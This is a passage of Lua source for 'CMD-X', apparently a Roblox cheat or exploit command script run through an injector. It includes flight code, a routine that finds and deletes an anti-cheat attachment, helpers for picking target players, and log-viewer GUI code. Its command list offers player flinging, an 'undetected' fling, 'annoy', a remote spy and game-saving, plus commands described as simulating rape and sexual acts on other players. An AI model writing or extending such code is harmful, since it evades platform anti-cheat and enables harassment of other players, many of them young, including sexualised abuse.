						while FLYING do
							if not vfly then
								cmdlp.Character:FindFirstChild("Humanoid").PlatformStand = true
							end
							if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
								SPEED = 50
							elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
								SPEED = 0
							end
							if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
								lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
							elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
							else
								BV.velocity = Vector3.new(0, 0, 0)
							end
							BG.cframe = workspace.CurrentCamera.CoordinateFrame
							wait()
						end
						CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
						lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
						SPEED = 0
						BG:destroy()
						BV:destroy()
						cmdlp.Character.Humanoid.PlatformStand = false
					end)
				end
				cmdm.KeyDown:connect(function(KEY)
					if KEY:lower() == 'w' then
						if vfly then
							CONTROL.F = speedofthevfly
						else
							CONTROL.F = speedofthefly
						end
					elseif KEY:lower() == 's' then
						if vfly then
							CONTROL.B = - speedofthevfly
						else
							CONTROL.B = - speedofthefly
						end
					elseif KEY:lower() == 'a' then
						if vfly then
							CONTROL.L = - speedofthevfly
						else
							CONTROL.L = - speedofthefly
						end
					elseif KEY:lower() == 'd' then
						if vfly then
							CONTROL.R = speedofthevfly
						else
							CONTROL.R = speedofthefly
						end
					elseif KEY:lower() == 'y' then
						if vfly then
							CONTROL.Q = speedofthevfly*2
						else
							CONTROL.Q = speedofthefly*2
						end
					elseif KEY:lower() == 't' then
						if vfly then
							CONTROL.E = -speedofthevfly*2
						else
							CONTROL.E = -speedofthefly*2
						end
					end
				end)
				cmdm.KeyUp:connect(function(KEY)
					if KEY:lower() == 'w' then
						CONTROL.F = 0
					elseif KEY:lower() == 's' then
						CONTROL.B = 0
					elseif KEY:lower() == 'a' then
						CONTROL.L = 0
					elseif KEY:lower() == 'd' then
						CONTROL.R = 0
					elseif KEY:lower() == 'y' then
						CONTROL.Q = 0
					elseif KEY:lower() == 't' then
						CONTROL.E = 0
					end
				end)
				FLY()
			end

			opxholder = Instance.new("Frame", getParent)
			opxviewertitle = Instance.new("TextLabel", getParent)
			xoutofopx = Instance.new("TextButton", getParent)
			opxscrollholder = Instance.new("Frame", getParent)
			opxreferer = Instance.new("TextLabel", getParent)
			opxsplitting = Instance.new("Frame", getParent)
			opxScrolling = Instance.new("TextLabel", getParent)

			opxholder.Name = "opxholder"
			opxholder.Parent = Unnamed
			opxholder.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			opxholder.BorderSizePixel = 0
			opxholder.Position = UDim2.new(0.217357904, 0, 0.208845213, 0)
			opxholder.Size = UDim2.new(0, 424, 0, 294)
			opxholder.Visible = false
			opxholder.Active = true
			createDrag(opxholder)

			opxviewertitle.Name = "opxviewertitle"
			opxviewertitle.Parent = opxholder
			opxviewertitle.BackgroundColor3 = Color3.new(1, 1, 1)
			opxviewertitle.BackgroundTransparency = 1
			opxviewertitle.Position = UDim2.new(0.264150947, 0, 0, 0)
			opxviewertitle.Size = UDim2.new(0, 200, 0, 22)
			opxviewertitle.Font = Enum.Font.GothamBold
			opxviewertitle.Text = "CMD-X OUTPUT-LONGER"
			opxviewertitle.TextColor3 = Color3.new(1, 1, 1)
			opxviewertitle.TextSize = 14

			xoutofopx.Name = "xoutofopx"
			xoutofopx.Parent = opxholder
			xoutofopx.BackgroundColor3 = Color3.new(1, 1, 1)
			xoutofopx.BackgroundTransparency = 1
			xoutofopx.Position = UDim2.new(0.948113203, 0, 0, 0)
			xoutofopx.Size = UDim2.new(0, 22, 0, 22)
			xoutofopx.Font = Enum.Font.GothamBold
			xoutofopx.Text = "X"
			xoutofopx.TextColor3 = Color3.new(1, 1, 1)
			xoutofopx.TextSize = 20
			xoutofopx.MouseButton1Down:Connect(function()
				opxholder.Visible = false
			end)

			opxscrollholder.Name = "opxscrollholder"
			opxscrollholder.Parent = opxholder
			opxscrollholder.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			opxscrollholder.BorderSizePixel = 0
			opxscrollholder.Position = UDim2.new(0.0306603778, 0, 0.0748299286, 0)
			opxscrollholder.Size = UDim2.new(0, 397, 0, 232)

			opxreferer.Name = "opxreferer"
			opxreferer.Parent = opxscrollholder
			opxreferer.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			opxreferer.BorderSizePixel = 0
			opxreferer.Size = UDim2.new(0, 397, 0, 20)
			opxreferer.Font = Enum.Font.Gotham
			opxreferer.Text = " Output-Longer"
			opxreferer.TextColor3 = Color3.new(1, 1, 1)
			opxreferer.TextSize = 14
			opxreferer.TextXAlignment = Enum.TextXAlignment.Left

			opxsplitting.Name = "splitting"
			opxsplitting.Parent = opxscrollholder
			opxsplitting.BackgroundColor3 = Color3.new(1, 1, 1)
			opxsplitting.BorderColor3 = Color3.new(1, 1, 1)
			opxsplitting.Position = UDim2.new(0.0100755664, 0, 0.0892857313, 0)
			opxsplitting.Size = UDim2.new(0, 389, 0, 0)

			opxScrolling.Name = "opxScrolling"
			opxScrolling.Parent = opxscrollholder
			opxScrolling.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			opxScrolling.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			opxScrolling.BorderSizePixel = 0
			opxScrolling.Position = UDim2.new(0.00986763742, 0, 0.102678575, 0)
			opxScrolling.Size = UDim2.new(0, 389, 0, 204)
			opxScrolling.TextColor3 = Color3.new(1, 1, 1)
			opxScrolling.TextSize = 12
			opxScrolling.Font = Enum.Font.Code
			opxScrolling.TextXAlignment = Enum.TextXAlignment.Left
			opxScrolling.TextYAlignment = Enum.TextYAlignment.Top
			opxScrolling.TextWrapped = true
			opxScrolling.TextScaled = true

			function opxL(title,text)
				opxreferer.Text = " "..title
				opxScrolling.Text = text
				opxholder.Visible = true
			end

			if _G.sCheck then _G.sCheck:Disconnect() end
			if sDetect then
				while not cmdlp.Character do
					cmdrs2.RenderStepped:Wait()
				end
				local check1 = cmdlp.Character:FindFirstChild("Head")
				if check1 then
					local check2 = check1:FindFirstChild(AntiCheat.Attachment)
					if check2 then
						check2:Destroy()
					end
				end
				_G.sCheck = cmdlp.CharacterAdded:Connect(function()
					if sDetect then
						wait(1)
						local check1 = cmdlp.Character:FindFirstChild("Head")
						if check1 then
							local check2 = check1:FindFirstChild(AntiCheat.Attachment)
							if check2 then
								check2:Destroy()
							end
						end
					end
				end)
			end

			---------------------------------------|
			-- Functions: -------------------------|
			function findplr(args, tbl)
				if tbl == nil then
					local tbl = cmdp:GetPlayers()
					if args == "me" then
						return cmdlp
					elseif args == "random" then 
						return tbl[math.random(1,#tbl)]
					elseif args == "new" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v.AccountAge < 30 and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "old" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v.AccountAge > 30 and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "bacon" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "friend" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "notfriend" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if not v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "ally" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v.Team == cmdlp.Team and v ~= cmdlp then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "enemy" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v.Team ~= cmdlp.Team then
								vAges[#vAges+1] = v
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "near" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v ~= cmdlp then
								local math = (v.Character:FindFirstChild("HumanoidRootPart").Position - cmdlp.Character.HumanoidRootPart.Position).magnitude
								if math < 30 then
									vAges[#vAges+1] = v
								end
							end
						end
						return vAges[math.random(1,#vAges)]
					elseif args == "far" then
						local vAges = {} 
						for _,v in pairs(tbl) do
							if v ~= cmdlp then
								local math = (v.Character:FindFirstChild("HumanoidRootPart").Position - cmdlp.Character.HumanoidRootPart.Position).magnitude
								if math > 30 then
									vAges[#vAges+1] = v
								end
							end
						end
						return vAges[math.random(1,#vAges)]
					else 
						for _,v in pairs(tbl) do
							if v.Name:lower():find(args:lower()) or v.DisplayName:lower():find(args:lower()) then
								return v
							end
						end
					end
				else
					for _, plr in pairs(tbl) do
						if plr.UserName:lower():find(args:lower()) or plr.DisplayName:lower():find(args:lower()) then
							return plr
						end
					end
				end
			end

			function cmdnum(str)
				return tonumber(str) ~= nil
			end

			function cmd15(plr)
				if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					return true
				end
			end

			function cmd6(plr)
				if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
					return true
				end
			end

			function x(v)
				if v then
					for _,i in pairs(workspace:GetDescendants()) do
						if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
							i.LocalTransparencyModifier = 0.5
						end
					end
				else
					for _,i in pairs(workspace:GetDescendants()) do
						if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
							i.LocalTransparencyModifier = 0
						end
					end
				end
			end

			logsholding2 = Instance.new("Frame", getParent)
			xoutoflogs2 = Instance.new("TextButton", getParent)
			logsscrollholder2 = Instance.new("Frame", getParent)
			refereral2 = Instance.new("TextLabel", getParent)
			splittinger2 = Instance.new("Frame", getParent)
			Scrollinglogs2 = Instance.new("ScrollingFrame", getParent)
			Save22 = Instance.new("TextBox", getParent)

			logsholding2.Name = "logsholding2"
			logsholding2.Parent = Unnamed
			logsholding2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			logsholding2.BorderSizePixel = 0
			logsholding2.Position = UDim2.new(0.217357904, 0, 0.208845213, 0)
			logsholding2.Size = UDim2.new(0, 424, 0, 294)
			logsholding2.Visible = false
			createDrag(logsholding2)
			logsholding2.Active = true

			xoutoflogs2.Name = "xoutoflogs2"
			xoutoflogs2.Parent = logsholding2
			xoutoflogs2.BackgroundColor3 = Color3.new(1, 1, 1)
			xoutoflogs2.BackgroundTransparency = 1
			xoutoflogs2.Position = UDim2.new(0.948113203, 0, 0, 0)
			xoutoflogs2.Size = UDim2.new(0, 22, 0, 22)
			xoutoflogs2.Font = Enum.Font.GothamBold
			xoutoflogs2.Text = "X"
			xoutoflogs2.TextColor3 = Color3.new(1, 1, 1)
			xoutoflogs2.TextSize = 20
			xoutoflogs2.MouseButton1Down:Connect(function()
				logsholding2.Visible = false
			end)

			logsscrollholder2.Name = "logsscrollholder2"
			logsscrollholder2.Parent = logsholding2
			logsscrollholder2.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			logsscrollholder2.BorderSizePixel = 0
			logsscrollholder2.Position = UDim2.new(0.0306603778, 0, 0.0748299286, 0)
			logsscrollholder2.Size = UDim2.new(0, 397, 0, 232)

			refereral2.Name = "refereral2"
			refereral2.Parent = logsscrollholder2
			refereral2.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			refereral2.BorderSizePixel = 0
			refereral2.Size = UDim2.new(0, 397, 0, 20)
			refereral2.Font = Enum.Font.Gotham
			refereral2.Text = " Username | Message"
			refereral2.TextColor3 = Color3.new(1, 1, 1)
			refereral2.TextSize = 14
			refereral2.TextXAlignment = Enum.TextXAlignment.Left

			splittinger2.Name = "splittinger2"
			splittinger2.Parent = logsscrollholder2
			splittinger2.BackgroundColor3 = Color3.new(1, 1, 1)
			splittinger2.BorderColor3 = Color3.new(1, 1, 1)
			splittinger2.Position = UDim2.new(0.0100755664, 0, 0.0892857313, 0)
			splittinger2.Size = UDim2.new(0, 389, 0, 0)

			Scrollinglogs2.Name = "Scrollinglogs2"
			Scrollinglogs2.Parent = logsscrollholder2
			Scrollinglogs2.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Scrollinglogs2.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			Scrollinglogs2.BorderSizePixel = 0
			Scrollinglogs2.Position = UDim2.new(0.00986763742, 0, 0.102678575, 0)
			Scrollinglogs2.Size = UDim2.new(0, 389, 0, 204)
			Scrollinglogs2.ScrollBarThickness = 10

			Save22.Name = "Save2"
			Save22.Parent = logsholding2
			Save22.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Save22.BorderSizePixel = 0
			Save22.Position = UDim2.new(0.275943398, 0, 0.887755096, 0)
			Save22.Size = UDim2.new(0, 188, 0, 26)
			Save22.Font = Enum.Font.GothamBold
			Save22.TextScaled = true
			Save22.Text = ""
			Save22.TextColor3 = Color3.new(1, 1, 1)
			Save22.TextSize = 14
			Save22.TextScaled = true
			Save22.PlaceholderText = "Type here..."
			Save22.FocusLost:Connect(function()
				require(cmdlp.PlayerScripts.ChatScript.ChatMain).MessagePosted:fire("SCHAT/console/type/"..Save22.Text)
			end)

			function CreateSCLabel(Prefix, Text)
				local plr = cmdp:GetChildren()
				local sf = Scrollinglogs2
				if #sf:GetChildren() >= 2546 then
					sf:ClearAllChildren()
				end
				local alls = 0
				for _,v in pairs(sf:GetChildren()) do
					if v then
						alls = v.Size.Y.Offset + alls
					end
					if not v then
						alls = 0
					end
				end
				local tl = Instance.new('TextLabel', sf)
				local il = Instance.new('Frame', tl)
				tl.Name = Prefix
				tl.ZIndex = 6
				tl.Text = "["..Prefix.."] "..Text
				tl.Size = UDim2.new(0,322,0,60)
				tl.BackgroundTransparency = 1
				tl.BorderSizePixel = 0
				tl.Font = "SourceSansBold"
				tl.Position = UDim2.new(-1,0,0,alls)
				tl.TextTransparency = 1
				tl.TextScaled = false
				tl.TextSize = 14
				tl.TextWrapped = true
				tl.TextXAlignment = "Left"
				tl.TextYAlignment = "Top"
				il.BackgroundTransparency = 1
				il.BorderSizePixel = 0
				il.Size = UDim2.new(0,12,1,0)
				il.Position = UDim2.new(0,316,0,0)
				tl.TextColor3 = Color3.fromRGB(255,255,255)
				tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
				sf.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
				sf.CanvasPosition = Vector2.new(0,sf.CanvasPosition.Y+tl.TextBounds.Y)
				local size2 = sf.CanvasSize.Y.Offset
				game:GetService("TweenService"):Create(tl, TweenInfo.new(.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Position = UDim2.new(0,3,0,alls)}):Play()
				for i = 0,50 do
					game:GetService("RunService").Heartbeat:Wait()
					tl.TextTransparency = tl.TextTransparency - 0.05
				end
				tl.TextTransparency = 0
			end

			logsholding = Instance.new("Frame", getParent)
			logsviewertitle = Instance.new("TextLabel", getParent)
			xoutoflogs = Instance.new("TextButton", getParent)
			logsscrollholder = Instance.new("Frame", getParent)
			refereral = Instance.new("TextLabel", getParent)
			splittinger = Instance.new("Frame", getParent)
			Scrollinglogs = Instance.new("ScrollingFrame", getParent)
			Save2 = Instance.new("TextButton", getParent)

			logsholding.Name = "logsholding"
			logsholding.Parent = Unnamed
			logsholding.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			logsholding.BorderSizePixel = 0
			logsholding.Position = UDim2.new(0.217357904, 0, 0.208845213, 0)
			logsholding.Size = UDim2.new(0, 424, 0, 294)
			logsholding.Visible = false
			createDrag(logsholding)
			logsholding.Active = true

			logsviewertitle.Name = "logsviewertitle"
			logsviewertitle.Parent = logsholding
			logsviewertitle.BackgroundColor3 = Color3.new(1, 1, 1)
			logsviewertitle.BackgroundTransparency = 1
			logsviewertitle.Position = UDim2.new(0.264150947, 0, 0, 0)
			logsviewertitle.Size = UDim2.new(0, 200, 0, 22)
			logsviewertitle.Font = Enum.Font.GothamBold
			logsviewertitle.Text = "CMD-X LOGS VIEWER"
			logsviewertitle.TextColor3 = Color3.new(1, 1, 1)
			logsviewertitle.TextSize = 14

			xoutoflogs.Name = "xoutoflogs"
			xoutoflogs.Parent = logsholding
			xoutoflogs.BackgroundColor3 = Color3.new(1, 1, 1)
			xoutoflogs.BackgroundTransparency = 1
			xoutoflogs.Position = UDim2.new(0.948113203, 0, 0, 0)
			xoutoflogs.Size = UDim2.new(0, 22, 0, 22)
			xoutoflogs.Font = Enum.Font.GothamBold
			xoutoflogs.Text = "X"
			xoutoflogs.TextColor3 = Color3.new(1, 1, 1)
			xoutoflogs.TextSize = 20
			xoutoflogs.MouseButton1Down:Connect(function()
				logsholding.Visible = false
			end)

			logsscrollholder.Name = "logsscrollholder"
			logsscrollholder.Parent = logsholding
			logsscrollholder.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			logsscrollholder.BorderSizePixel = 0
			logsscrollholder.Position = UDim2.new(0.0306603778, 0, 0.0748299286, 0)
			logsscrollholder.Size = UDim2.new(0, 397, 0, 232)

			refereral.Name = "refereral"
			refereral.Parent = logsscrollholder
			refereral.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			refereral.BorderSizePixel = 0
			refereral.Size = UDim2.new(0, 397, 0, 20)
			refereral.Font = Enum.Font.Gotham
			refereral.Text = " Username | Message"
			refereral.TextColor3 = Color3.new(1, 1, 1)
			refereral.TextSize = 14
			refereral.TextXAlignment = Enum.TextXAlignment.Left

			splittinger.Name = "splittinger"
			splittinger.Parent = logsscrollholder
			splittinger.BackgroundColor3 = Color3.new(1, 1, 1)
			splittinger.BorderColor3 = Color3.new(1, 1, 1)
			splittinger.Position = UDim2.new(0.0100755664, 0, 0.0892857313, 0)
			splittinger.Size = UDim2.new(0, 389, 0, 0)

			Scrollinglogs.Name = "Scrollinglogs"
			Scrollinglogs.Parent = logsscrollholder
			Scrollinglogs.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Scrollinglogs.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			Scrollinglogs.BorderSizePixel = 0
			Scrollinglogs.Position = UDim2.new(0.00986763742, 0, 0.102678575, 0)
			Scrollinglogs.Size = UDim2.new(0, 389, 0, 204)
			Scrollinglogs.ScrollBarThickness = 10

			Save2.Name = "Save"
			Save2.Parent = logsholding
			Save2.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Save2.BorderSizePixel = 0
			Save2.Position = UDim2.new(0.275943398, 0, 0.887755096, 0)
			Save2.Size = UDim2.new(0, 188, 0, 26)
			Save2.Font = Enum.Font.GothamBold
			Save2.Text = "Save as .txt"
			Save2.TextColor3 = Color3.new(1, 1, 1)
			Save2.TextSize = 14
			Save2.MouseButton1Down:Connect(function()
				writestats2 = "\n"
				for _,v in pairs(Scrollinglogs:GetChildren()) do
					writestats2 = writestats2.."\n"..v.Text
				end
				writefile("CMD-X Logs "..math.random(1000)..".txt",tostring(writestats2))
			end)

			function CreateLabel(Name, Text)
				local plr = cmdp:GetChildren()
				local sf = Scrollinglogs
				if #sf:GetChildren() >= 2546 then
					sf:ClearAllChildren()
				end
				local alls = 0
				for _,v in pairs(sf:GetChildren()) do
					if v then
						alls = v.Size.Y.Offset + alls
					end
					if not v then
						alls = 0
					end
				end
				local tl = Instance.new('TextLabel', sf)
				local il = Instance.new('Frame', tl)
				tl.Name = Name
				tl.ZIndex = 6
				tl.Text = "["..Name.."]  | "..Text
				tl.Size = UDim2.new(0,322,0,60)
				tl.BackgroundTransparency = 1
				tl.BorderSizePixel = 0
				tl.Font = "SourceSansBold"
				tl.Position = UDim2.new(-1,0,0,alls)
				tl.TextTransparency = 1
				tl.TextScaled = false
				tl.TextSize = 14
				tl.TextWrapped = true
				tl.TextXAlignment = "Left"
				tl.TextYAlignment = "Top"
				il.BackgroundTransparency = 1
				il.BorderSizePixel = 0
				il.Size = UDim2.new(0,12,1,0)
				il.Position = UDim2.new(0,316,0,0)
				tl.TextColor3 = Color3.fromRGB(255,255,255)
				tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
				sf.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
				sf.CanvasPosition = Vector2.new(0,sf.CanvasPosition.Y+tl.TextBounds.Y)
				local size2 = sf.CanvasSize.Y.Offset
				tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
				for i = 0,50 do 
					wait(0.05)
					tl.TextTransparency = tl.TextTransparency - 0.05
				end
				tl.TextTransparency = 0
			end

			function CreateADLabel(name,rank)
				local sf3 = Scrollingad
				if #sf3:GetChildren() >= 2546 then
					sf3:ClearAllChildren()
				end
				local alls3 = 0
				for _,v in pairs(sf3:GetChildren()) do
					if v then
						alls3 = v.Size.Y.Offset + alls3
					end
					if not v then
						alls3 = 0
					end
				end
				local tl3 = Instance.new('TextLabel', sf3)
				local il3 = Instance.new('Frame', tl3)
				tl3.Name = name
				tl3.ZIndex = 6
				tl3.Text = name.." | "..rank
				tl3.Size = UDim2.new(0,322,0,50)
				tl3.BackgroundTransparency = 1
				tl3.BorderSizePixel = 0
				tl3.Font = "SourceSansBold"
				tl3.Position = UDim2.new(-1,0,0,alls3)
				tl3.TextTransparency = 1
				tl3.TextScaled = false
				tl3.TextSize = 14
				tl3.TextWrapped = true
				tl3.TextXAlignment = "Left"
				tl3.TextYAlignment = "Top"
				il3.BackgroundTransparency = 1
				il3.BorderSizePixel = 0
				il3.Size = UDim2.new(0,12,1,0)
				il3.Position = UDim2.new(0,316,0,0)
				tl3.TextColor3 = Color3.fromRGB(255,255,255)
				tl3.Size = UDim2.new(0,322,0,tl3.TextBounds.Y)
				sf3.CanvasSize = UDim2.new(0,0,0,alls3+tl3.TextBounds.Y)
				sf3.CanvasPosition = Vector2.new(0,sf3.CanvasPosition.Y+tl3.TextBounds.Y)
				local size33 = sf3.CanvasSize.Y.Offset
				tl3:TweenPosition(UDim2.new(0,3,0,alls3), 'In', 'Quint', 0.5)
				tl3.TextTransparency = 0
			end

			local CMDS = {}
			CMDS.commands = {
				["prefix"] = "Shows you the chat prefix.",
				["promptnew"] = "Changes your prompt text to something else.",
				["prefixnew"] = "Changes chat prefix.",
				["hotkeyopen"] = "Changes your hotkey for opening the GUI.",
				["hotkeyfocus"] = "Changes your hotkey for focusing on the cmdbar.",
				["entercmdnew"] = "Adds a new command which runs when you first execute CMD-X.",
				["entercmds"] = "Allows you to add entercmds.",
				["entercmddel"] = "Deletes a command in the entercmds list.",
				["entercmdsclr"] = "Clears the entercmds.",
				["eightballpu"] = "Ask 8Ball a question publicly.",
				["eightballpr"] = "Ask 8Ball a question privately.",
				["friendjoin"] = "Joins your friends game.",
				["support"] = "If you need support while using CMD-X use this command!",
				["commands"] = "Shows this page.",
				["advertise"] = "Help spread CMD-X by doing this cmd in game! (<3)",
				["unadvertise"] = "()",
				["version"] = "Shows version.",
				["walkspeed"] = "Sets your characters walkspeed.",
				["defaultwalkspeed"] = "()",
				["jumppower"] = "Sets your characters jumppower.",
				["defaultjumppower"] = "()",
				["hipheight"] = "Sets your characters hipheight.",
				["defaulthipheight"] = "()",
				["gravity"] = "Sets your characters gravity.",
				["defaultgravity"] = "()",
				["bodypositionwalkspeed"] = "Modifies your characters bodyposition walkspeed.",
				["halve"] = "Splits your character into two.",
				["removehands"] = "Removes your characters hands.",
				["removefeet"] = "Removes your characters feet.",
				["removeleftleg"] = "Removes your left leg.",
				["removerightleg"] = "Removes your right leg.",
				["removeleftarm"] = "Removes your left arm.",
				["removerightarm"] = "Removes your right arm.",
				["removearms"] = "Removes your characters arms.",
				["removelegs"] = "Removes your characters legs.",
				["removelimbs"] = "Removes your characters limbs.",
				["removeanim"] = "Removes your characters animations.",
				["restoreanim"] = "Restores your characters animations.",
				["resizehead"] = "Resizes your characters head.",
				--["removeshirt"] = "Removes your characters shirt.",
				--["removetshirt"] = "Removes your characters tshirt",
				--["removepants"] = "Removes your characters pants.",
				--["removeclothes"] = "Removes your character clothes.",
				["removehatsmesh"] = "Removes your characters hat meshes.",
				["removegearmesh"] = "Removes your current characters gear mesh.",
				--["drophats"] = "Drops your characters hats on the map.",
				["dropgears"] = "Drops your characters gears on the map.",
				--["hatspam"] = "Spams your hats onto the map.",
				--["unhatspam"] = "()",
				["removeface"] = "Removes your characters face.",
				["removehats"] = "Removes your characters hats.",
				["rheadmesh"] = "Removes the mesh of your characters head.",
				["equip"] = "Equips all gears in your characters backpack.",
				["banlands"] = "Teleports player to banlands (NEED A HAT AND TOOL).",
				["flip"] = "Allows your character to flip.",
				["unflip"] = "Stops flip.",
				["doubleflip"] = "Allows your character to double flip.",
				["undoubleflip"] = "Stops doubleflip.",
				["glue"] = "Sticks your character to the target.",
				["unglue"] = "Unsticks your character from the target.",
				["nugget"] = "Makes your character look like a nugget.",
				["cartwheel"] = "Makes your character do a cartwheel.",
				["uncartwheel"] = "Stops your character's cartwheel",
				["seizure"] = "Makes your character have a seizure.",
				["unseizure"] = "Stops your character's seizure.",
				["fling"] = "Flings player.",
				["invisiblefling"] = "Invisibly flings players.",
				["freefling"] = "Flings players.",
				["unfling"] = "Stops flinging.",
				["cleanfling"] = "Flings players in an undetected way. (COLLISION ONLY)",
				["lag"] = "Appears like your character is stuttering or lagging.",
				["unlag"] = "()",
				["annoy"] = "Annoys the player.",
				["unannoy"] = "()",
				["weaken"] = "Weakens your character.",
				["strengthen"] = "Strengthens your character.",
				["noresult"] = "Saved CMD NUM",
				["unweak"] = "()",
				["plague"] = "Starts a plague.",
				["parts"] = "Lists parts.",
				["bringunanchored"] = "Brings unachored parts (works best with .loop).",
				["listunanchored"] = "Lists unanchored parts.",
				["credits"] = "Lists credits for CMD-X.",
				["animation"] = "Plays the AnimationID you state in num1 and speeds it up in num2. (R6 ONLY)",
				["unanimation"] = "Stops all animations.",
				["uninsane"] = "()",
				["monstermash"] = "Monster mashes your character. (R6 ONLY)",
				["ragdoll"] = "Stuns your character.",
				["unragdoll"] = "()",
				["animpack"] = "Loads the animation you state; toy/ pirate/ knight/ astronaut/ vampire/ robot/ levitation/ bubbly/ werewolf/ stylish/ mage/ cartoony/ zombie/ superhero/ ninja/ elder/ old/ toilet. (R15 ONLY)",
				["spin"] = "Spins your character around like a beyblade.",
				["unspin"] = "()",
				["hatspin"] = "Spins your characters hats around your head.",
				["unhatspin"] = "()",
				["facefuck"] = "Sits your character in front of their face to create the illusion of facefucking.",
				["unfacefuck"] = "()",
				["facefuckanim"] = "Places your character in front of their face with an animation to create the illusion of facefucking.",
				["unfacefuckanim"] = "()",
				["piggyback"] = "Sits your character behind their head to create the illusion of a piggy back.",
				["unpiggyback"] = "()",
				["fuck"] = "Rapes player you stated using an animation.",
				["unfuck"] = "()",
				["follow"] = "Follows player you stated at a safe distance.",
				["unfollow"] = "()",
				["oldroblox"] = "Makes your game look like old roblox.",
				["savegame"] = "Saves the current game instance to your workspace folder. (SYNAPSE ONLY)",
				["btools"] = "Gives you building tools. (CLIENT SIDED)",
				["fex"] = "Gives you advanced building tools. (CLIENT SIDED) (GUI)",
				["remotespy"] = "Opens remote spy. (GUI)",
				["badger"] = "Opens badger V2. (GUI) (<3)",
				["removeeffects"] = "Removes all effects in the game. (CLIENT SIDED)",
				["removeseats"] = "Removes all seats in game. (CLIENT SIDED)",
				["removelocalscripts"] = "Removes all local scripts",
				["xray"] = "Changes all items to 0.5 Transparency.",
				["unxray"] = "()",
				["lockws"] = "Locks all of workspace.",
				["unlockws"] = "Unlocks all of workspace.",
				["day"] = "Turns the skybox time to day (18:00). (CLIENT SIDED)",
				["night"] = "Turns the skybox time to night (00:00). (CLIENT SIDED)",
				["removesky"] = "Removes the games skybox. (CLIENT SIDED)",
				["restorelighting"] = "Restores games lighting. (CLIENT SIDED)",
				["restorecamera"] = "Restores your characters camera.",
				["unscramble"] = "Unscrambles games variable names.",
				["removeinviswalls"] = "Removes invisible walls in game. (CLIENT SIDED)",
				["math"] = "-",
				["hidechat"] = "Turns off chat.",
				["showchat"] = "Turns on chat.",
